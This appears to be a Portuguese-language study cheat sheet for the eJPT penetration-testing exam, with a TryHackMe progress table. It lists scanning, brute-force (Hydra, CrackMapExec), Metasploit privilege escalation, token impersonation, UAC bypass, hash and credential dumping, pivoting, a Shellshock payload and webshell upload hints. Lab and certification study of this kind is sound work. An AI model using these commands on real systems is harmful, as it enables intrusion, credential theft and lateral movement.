# 🧠 eJPT Cheat Sheet

---

## 🔍 Nmap

```bash
# Scan inicial
nmap -Pn -T4 -F <IP>

# Scan completo
nmap -Pn -p- -T4 <IP>

# Serviços + scripts
nmap -sC -sV -p <PORTAS> <IP>

# Completo agressivo
nmap -Pn -A -v <IP>

# Output
nmap -oN scan.txt -oX scan.xml <IP>
```

---

## 💣 Metasploit

Como procurar payloads (Meterpreter):

```bash
show payloads 

search type:payload meterpreter
```

Uso comum:

```bash
use exploit/multi/handler                    # fazer shell dentro do msfconsole
use post/multi/manage/shell_to_meterpreter   # melhorar a shell
use post/multi/recon/local_exploit_suggester # sugestão para exploit local
```

---

## 🐍 Shell Upgrade

```bash
# Python 3
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Python 2
python -c 'import pty; pty.spawn("/bin/sh")'

# Alternativo
python -c 'import os; os.system("/bin/bash")'
```

---

## 🔐 Privilege Escalation - Linux

```bash
whoami
id
uname -a
cat /etc/os-release
cat /etc/crontab
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
ps aux | grep root
```

## PrivEsc Windows 

```bash
whoami
whoami /priv
whoami /groups

systeminfo
hostname
ver

net user
net localgroup
net localgroup administrators

cmdkey /list
runas /?

dir C:\ /s /b | findstr /i "password"
dir C:\ /s /b | findstr /i ".config .xml .ini .txt"

tasklist /v

ipconfig /all
netstat -ano
route print
arp -a

net share


# 🪟 Windows DIR Cheat Sheet 🔹 Básico
- `dir` → lista arquivos do diretório atual
- `dir /s` → busca recursiva (subpastas)
- `dir /b` → saída limpa (somente caminhos)
- `dir /a` → inclui arquivos ocultos e de sistema
- `dir /q` → mostra dono do arquivo
```

### metasploit

```bash
# =========================
# 🔎 ENUM BÁSICA
# =========================
getuid
sysinfo
getprivs

# =========================
# 🔥 TENTATIVA AUTOMÁTICA
# =========================
getsystem

# =========================
# 🎭 TOKEN IMPERSONATION
# =========================
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"

# =========================
# 🧨 BYPASS UAC (SE FOR ADMIN)
# =========================
background
use exploit/windows/local/bypassuac
set SESSION <ID>
run

# =========================
# 🔐 DUMP DE HASHES
# =========================
hashdump

# =========================
# 🧠 PÓS-EXPLORAÇÃO
# =========================
ps
migrate <PID>

# =========================
# 📂 COLETA DE DADOS
# =========================
ls
pwd
download <arquivo>

# =========================
# 🌐 REDE / MOVIMENTO LATERAL
# =========================
ipconfig
arp
netstat

# =========================
# 💀 EXTRA (SE TIVER PRIV)
# =========================
load kiwi
creds_all
```

---

## 🌐 Web / Arquivos

# Prestar atenção em arquivos de backup e variações

```
.bak
.old
.save
.zip
.tar
```

Exemplos:
```
wp-config.php.bak
config.old
backup.sql
```

## 📥 Wget (Mirror)

```bash
wget -r -np -nH --cut-dirs=1 <URL>   # baixar arquivos em modo mirror
```

---

## 🔓 Brute Force / Enumeração Ativa

As Wordlists mais usadas no curso estão no path: `/usr/share/wordlists/metasploit`

### 💣 Hydra

```bash
# SSH
hydra -l <user> -P wordlist.txt ssh://<IP>

# FTP
hydra -l <user> -P wordlist.txt ftp://<IP>

# HTTP POST login
hydra -l <user> -P wordlist.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

### 🚀 FFUF

```bash
# Descoberta de diretórios
ffuf -u http://<IP>/FUZZ -w wordlist.txt

# Extensões
ffuf -u http://<IP>/FUZZ -w wordlist.txt -e .php,.txt,.bak

# Virtual hosts
ffuf -u http://<IP> -H "Host: FUZZ.<domain>" -w wordlist.txt

# Filtrar por tamanho
ffuf -u http://<IP>/FUZZ -w wordlist.txt -fs 0
```

---

## 🧾 SMB

```bash
smbclient -L //<IP> -N
smbclient //<IP>/share -N
```

```bash
while read -r share; do 
  echo "Testing share: $share"
  smbclient "//target.ine.local/$share" -N -c "ls" &>/dev/null && \
  echo "[+] Successfully accessed share: $share"
done < /root/Desktop/wordlists/shares.txt
```


### 🧨 CrackMapExec

```bash
# SMB brute force
crackmapexec smb <IP> -u users.txt -p passwords.txt

# Validar credenciais
crackmapexec smb <IP> -u <user> -p <pass>

# Executar comando
crackmapexec smb <IP> -u <user> -p <pass> -x "whoami"
```

---

## 🔄 Pivoting

_Existe mais de um IP na rede DMZ e talvez seja exatamente por isso que seja necessário realizar o pivoteamento._

_Dentro da DMZ tem mais de uma máquina, mas aparentemente só tem uma máquina que tem comunicação com a rede interna, preciso descobrir qual é e fazer o pivot o quanto antes._

_Para realizar o pivoteamento o melhor cenário é o MSF Routing usando MSF autoroute + portfwd_


---
## 🎯 Ataques Específicos

_Alguns cenários exigem ataques direcionados a serviços ou vulnerabilidades específicas, exigindo identificação precisa do vetor e execução manual._

_Um exemplo clássico é o ataque de Shellshock, que explora variáveis de ambiente em servidores vulneráveis ao Bash, podendo ser realizado manualmente através de headers HTTP._

**📌 Shellshock (Manual)**
- Vetor: Header `User-Agent`
- Payload: `() { :; }; echo; /bin/bash -c 'cat /flag.txt'`
- EVIDENCIA DO CURSO:
<img width="1913" height="983" alt="image" src="https://github.com/user-attachments/assets/02f2aba8-290f-451b-9652-cc420b80ff62" />


_Durante testes, alguns serviços podem abrir vetores diretos de exploração ou pós-exploração:_

- **WebDAV**
  - Pode permitir upload de webshells
  - Útil para RCE em servidores IIS mal configurados

- **PsExec**
  - Execução remota via SMB
  - Muito utilizado em movimentação lateral

---

**📌 Webshells (ASP)**
- Caminho comum: `/usr/share/webshells/asp/webshell.asp`

  
_Pode ser utilizado após upload via WebDAV ou outras falhas de upload para obter execução remota de comandos._

---

```bash
ip a
route -n
```

```bash
run autoroute -s <REDE>
portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <IP>
```

---

## 📊 Organização

_No momento que a prova iniciar é importante que tenha uma planilha com os seguintes tópicos_

| Nome do host | IP | Serviços | Credenciais | Vulnerabilidades | Observações |
|--------------|----|----------|-------------|------------------|-------------|

---

## 🚨 Dicas Importantes

- Verificar `/etc/hosts`
- Observar banners de serviços e protocolos (podem conter dicas ou flags)
- Testar credenciais em TODOS os serviços
- Procurar:
  - backups
  - configs
  - logs

---

## 🏁 Flags

_Aparentemente as perguntas te guiam para onde estão as flags_

Formato:
```
FLAG{hashMD5}
```

Exemplo:
```
FLAG1{23c7d4bababf8048c0cda5136ac83c9e}
```

✔ Enviar apenas:
```
23c7d4bababf8048c0cda5136ac83c9e
```

---

# 🧠 TryHackMe - Controle de Estudos

---

## 📊 Progresso das Máquinas

| Máquina         | Tipo       | Dificuldade | Status | 
|-----------------|------------|-------------|--------|
| Ignite          | Web        | Easy        | 🟩     |
| Startup         | Linux      | Easy        | 🟩     |
| RootMe          | Web        | Easy        | 🟨     |
| Blog WordPress  | Web        | Easy        | ⬜     |
| Blue            | Windows    | Easy        | 🟨     |
| Blueprint       | Windows    | Easy        | ⬜     |

---

## ✅ Legenda

- ⬜ Não iniciado
- 🟨 Em andamento
- 🟩 Concluído

---

## 🧠 Notas Gerais

- Reutilizar credenciais entre serviços
- Focar em enumeração antes de explorar
- Testar sempre SMB, HTTP e FTP
- Procurar arquivos de backup (.bak, .old, .save)
- Observar banners e versões
- Documentar tudo durante o processo

